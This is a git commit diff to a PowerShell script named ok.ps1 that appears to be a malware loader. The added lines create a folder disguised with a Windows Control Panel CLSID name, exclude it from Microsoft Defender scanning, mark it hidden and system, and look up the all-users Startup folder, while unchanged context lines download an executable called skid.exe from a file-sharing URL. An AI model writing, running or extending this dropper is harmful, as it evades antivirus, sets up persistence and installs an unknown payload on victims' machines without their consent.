caa637b0fa28112017e21e49537d9cedbf53ac19
43a1723 <hai1723notgay@gmail.com>
2025-03-05 14:24:31 +0700

    Update ok.ps1

--- ok.ps1
+++ ok.ps1
@@ -1,4 +1,10 @@
-$folderPath = "C:\ProgramData\LocalLow\LanPiaoPiao"
+$rdir = "$env:SystemDrive\ProgramData\Loader"
+$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
+attrib +h +s $dir
+$folderPath = $dir
 $filePath = "$folderPath\skid.exe"
 $url = "https://anonsharing.com/file/2732c05456f80575/skid.exe"
 
